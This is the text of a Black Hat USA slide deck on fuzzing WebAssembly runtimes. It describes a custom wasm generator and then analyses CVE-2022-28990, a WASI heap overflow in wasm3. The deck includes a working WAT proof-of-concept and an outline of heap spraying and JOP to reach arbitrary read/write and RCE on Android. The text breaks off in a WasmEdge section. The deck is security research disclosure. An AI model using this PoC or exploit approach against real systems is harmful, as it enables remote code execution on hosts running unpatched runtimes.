Is WebAssembly Really Safe? - Wasm VM Escape and 
RCE Vulnerabilities Have Been Found in New Way
Zhao Hai(@h1zhao)
#BHUSA  @BlackHatEvents 
#BHUSA   @BlackHatEvents
Information Classification: General
About US
TianYu Lab of Cyberpeace Tech Co., Ltd.
天虞实验室
TianYu Lab
Lei Li
Supervisor
Mengchen Yu
Manager
Zhichen Wang
Researcher
Hai Zhao
Researcher
#BHUSA   @BlackHatEvents
Information Classification: General
Agenda
• WebAssembly Runtime Introduction
• WebAssembly Fuzz Tools Develop
• Vulnerabilities Analyse And Exploit Develop
• Conclusion
#BHUSA   @BlackHatEvents
Information Classification: General
What we focus? - WebAssembly Runtime
Previous Researches 
focus on
We are 
interested in
#BHUSA   @BlackHatEvents
Information Classification: General
WebAssembly Runtime Architecture
The stack is divided 
into two parts. 
Bounds Check
BOF? sorry
WASI is a system 
interface. Similar to 
syscall in c
Docker？
#BHUSA   @BlackHatEvents
Information Classification: General
WebAssembly Runtime Vulnerability
Bounds Check
I would say WASM 
standard is really safe, 
but not its runtime.
Maybe 
vulnerable
#BHUSA   @BlackHatEvents
Information Classification: General
WASM Fuzz Develop
•
Focus on WASM file structure、WASI API、bytecode implemention in runtime.
•
Coverage guide fuzzing. 
Wasm generator use AFL/libfuzzer’s 
output samples as input data, mapping 
them to wasm files
Coverage guide 
samples
do I am 
coverage 
guided?
#BHUSA   @BlackHatEvents
Information Classification: General
WASM Generator / Structure
• Follow wasm format, we develop the wasm generator.
• Core idea is to make the Non randomizable fields fixed or 
calculated, otherwise use the data read from the fuzzer’s 
samples.
Fixed magic and version
Fixed range(0~16) Section ID 
Calculated Section Len 
randomizable field
……
#BHUSA   @BlackHatEvents
Information Classification: General
WASM Generator / Structure
Our generator use C++ objects to handle every types of section, every fields of 
section, this is easy to implement.
class Section { 
   public:
      virtual SectionId id() = 0;
      virtual void generate(Context *context);
      virtual void getEncode(DataOutputStream *out); 
};
The function generate is used to generate data, and getEncode is used to encode 
the data into the corresponding format.
#BHUSA   @BlackHatEvents
Information Classification: General
WASM Generator / Structure
• For randomizable fields in the structure, we design a strategic 
data generator.
We make the boundary value have 
higher frequency.
0xffffffff(int)、
NAN(float/double)、……
This is not a random number, 
it’s read from the fuzzer’s 
output samples.
#BHUSA   @BlackHatEvents
Information Classification: General
WASM Generator / ByteCode
• To Fuzz the wasm runtime’s bytecode implemention, We need 
generate bytecode in the wasm file.
ByteCode sequences 
Our generator use C++ 
objects to handle every 
bytecode, randomize or fix 
its operands with context.
class Instruction {
   public:
      virtual void generate(Context *context) = 0;
      virtual void getByteCode(DataOutputStream *code) = 0;
};
#BHUSA   @BlackHatEvents
Information Classification: General
WASM Generator / ByteCode
• For example, When we generate the bytecode “Call”, We should avoid 
call recursion, because we can’t generate condition correctly.
Use dfs algorithm 
to check loop
Add current 
function index to 
graph
void Instruction::Call::generate(Context *context) { 
   f.generate(context);
   while (context->check_loop(from_where, f.value)) {
      f.value++; 
   }
   context->add_cfg(from_where, f.value);
}
#BHUSA   @BlackHatEvents
Information Classification: General
•
To Fuzz the wasi api, We need import the wasi api strings on Import Section.
map imports_function;
vector imports_function_name;
#define ADD_IMPORT_FUNC(name, module) imports_function[name] = module; \
                                                                          imports_function_name.push_back(name);
void initImportsFunction() {
   ADD_IMPORT_FUNC("args_get","wasi_snapshot_preview1")
   ADD_IMPORT_FUNC("args_sizes_get","wasi_snapshot_preview1")
   ......
}
void Sections::ImportType::generate(Context *context) {
......// WASI Imports
   {
      string &n = CHOICE_VEC(imports_function_name); 
      name = strdup(n.c_str());
      name_len = strlen(name);
      module = strdup(imports_function[n].c_str());
      module_len = strlen(module);
   }
   ......
}
Easy to implement in 
our object model.
WASM Generator / WASI
#BHUSA   @BlackHatEvents
Information Classification: General
Embedding in libfuzzer for fuzzing.
WASM Generator / WASI
#BHUSA   @BlackHatEvents
Information Classification: General
Vulnerability – CVE-2022-28990
Heap Overflow in WASI read/write API in wasm3
m3ApiRawFunction(m3wasigenericfdread)
{
    m3ApiReturnType  (uint32t)
    m3ApiGetArg      (uvwasifdt          , fd)
    m3ApiGetArgMem   (wasiiovect        , wasiiovs)
    m3ApiGetArg      (uvwasisizet        , iovslen)
    m3ApiGetArgMem   (uvwasisizet       , nread)
    m3ApiCheckMem(wasiiovs,    iovslen  sizeof(wasiiovect));
    m3ApiCheckMem(nread,        sizeof(uvwasisizet));
......
    uvwasisizet numread;
    uvwasierrnot ret;
    for (uvwasisizet i = 0; i  fdread fd:%d iov%d.len:%dn", fd, i, iovs[i].buflen);
    }
    ret = uvwasifdread(&uvwasi, fd, (const uvwasiiovect ) iovs, iovslen, &numread);
......
}
Bounds not 
check!
#BHUSA   @BlackHatEvents
Information Classification: General
POC – CVE-2022-28990
(module
  (type (;0;) (func))
  (type (;1;) (func (param i32 i32 i32 i32) (result i32)))
  (import "wasi_snapshot_preview1" "fd_write" (func $__fd_write (type 1)))
  (func $_start (type 0)
     i32.const 0
     i32.const 0x10000
     i32.store
     i32.const 0x4
     i32.const 0xffff
     i32.store
     i32.const 0x100
     i32.const 0
     i32.store
     i32.const 0x1
     i32.const 0x0
     i32.const 0x1
     i32.const 0x100
     call $__fd_write
     drop
  )
  (memory (;0;) 0x2)
  (export "_start" (func $_start))
)
fd
wasiiovs offset
iovslen
nread offset
buf offset
buf len
It’s easy to get OOB 
read / write by using 
fd_read / fd_write.
#BHUSA   @BlackHatEvents
Information Classification: General
wasm3 uses a _PC stack and _SP stack, where the _PC stack stores a series of runtime functions 
and parameters corresponding to opcode. The parameter in the _PC stack uses slot index, which 
represents the parameter read from the subscript in _SP.
Heap spray, make the 
wasm3’s memory 
object in front of _pc 
stack and then 
overflow it.
EXP – CVE-2022-28990
#BHUSA   @BlackHatEvents
Information Classification: General
d_m3Op  (opcode_xx)
{
    //do something
    ......
    nextOp ();
}
•
Every opcode handle has a jmp code to next opcode handle.
•
We can use JOP (Jump-Oriented Programming) to control the VM’s execution flow. 
Use 
GetGlobal_i64/SetGlobal_i64
opcode handle to get 
arbitrary address read / write
d_m3Op  (SetGlobal_i64)
{
    u64 * global = immediate (u64 *);
    * global = (u64) _r0; 
    nextOp ();
}
Immediate argument is in 
_pc stack, we can control 
it!
EXP – CVE-2022-28990
#BHUSA   @BlackHatEvents
Information Classification: General
EXP – CVE-2022-28990 – On Android
•
When wasm3 on Android, the memory object always in behind of _pc stack because of scudo allocator. 
So we should make some heap spray to get desired layout.
heap spray
How to spray memory 
and _pc stack?
#BHUSA   @BlackHatEvents
Information Classification: General
•
We found that wasm3 has more than one _pc stack.
When reaches end of 
_pc stack0, vm control 
flow would jump to next 
page of _pc stack.
Look at the compiler of opcode “br_table”
static M3Result  Compile_BranchTable  (IM3Compilation o, m3
opcode_t i_opcode)
{
......
    for (u32 i = 0; i page;
        o->page = continueOpPage;
  ......
_       (EmitOp (o, op_ContinueLoop));
         EmitPointer (o, scope->pc);
  ......
}
construct a 
table
When current _pc 
stack is fulfilled, it 
would allocate a new 
page of _pc stack.
Just use this for spray more _pc stack and get the desired 
heap layout.
br_table 0 (;@0;)0 (;@0;)0 (;@0;)0 (;@0;)...... 0 (;@0;)
EXP – CVE-2022-28990 – On Android
#BHUSA   @BlackHatEvents
Information Classification: General
•
Get arbitrary address read / write and then RCE it.
fake some instructions 
such as 
global.get/global.set in 
_pc stack  to get 
arbitrary address read / 
write and then exploit it!
EXP – CVE-2022-28990 – On Android
#BHUSA   @BlackHatEvents
Information Classification: General
Vulnerability – Slot missing in bytecode
No emit slot if value is in 
register
static M3Result  Compile_Memory_CopyFill  (IM3Compilation o, m3
opcode_t i_opcode)
{
......
_   (EmitOp  (o, op));
_   (PopType (o, c_m3Type_i32));
_   (EmitSlotNumOfStackTopAndPop (o));
_   (EmitSlotNumOfStackTopAndPop (o));
......
}
d_m3Op  (MemFill)
{
    u32 size = (u32) _r0;
    u32 byte = slot (u32);
    u64 destination = slot (u32);
……
}
static inline M3Result  EmitSlotNumOfStackTopAndPop  (IM3Compilation o)
{
    // no emit if value is in register
    if (IsStackTopInSlot (o))
        EmitSlotOffset (o, GetStackTopSlotNumber (o));
    return Pop (o);
}
Need two 
slot
But
#BHUSA   @BlackHatEvents
Information Classification: General
d_m3Op  (MemFill)
{
    u32 size = (u32) _r0;
    u32 byte = slot (u32);
    u64 destination = slot (u32);
……
}
No emit because value 
is in register 
args3 (destination) 's slot is 
missing, using next value as slot 
index
Ov erflow
Vulnerability – Slot missing in bytecode
#BHUSA   @BlackHatEvents
Information Classification: General
d_m3Op  (MemFill)
{
    u32 size = (u32) _r0;
    u32 byte = slot (u32);
    u64 destination = slot (u32);
……
}
The slot value can’t control 
arbitrary, so it will result in 
segmentation fault, 
unexploitable.
Vulnerability – Slot missing in bytecode
#BHUSA   @BlackHatEvents
Information Classification: General
WasmEdge – Architecture
Let’s see the vm 
architecture of WasmEdge
Differ from wasm3, it 
use "while-switch" to 
dispatch opcode
#BHUSA   @BlackHatEvents
Information Classification: General
WasmEdge – Br Opcode Analyse
Expect Executor::execute(Runtime::StoreManager &StoreMgr,
                               Runtime::StackManager &StackMgr,
                               const AST::InstrView::iterator Start,
                               const AST::InstrView::iterator End) {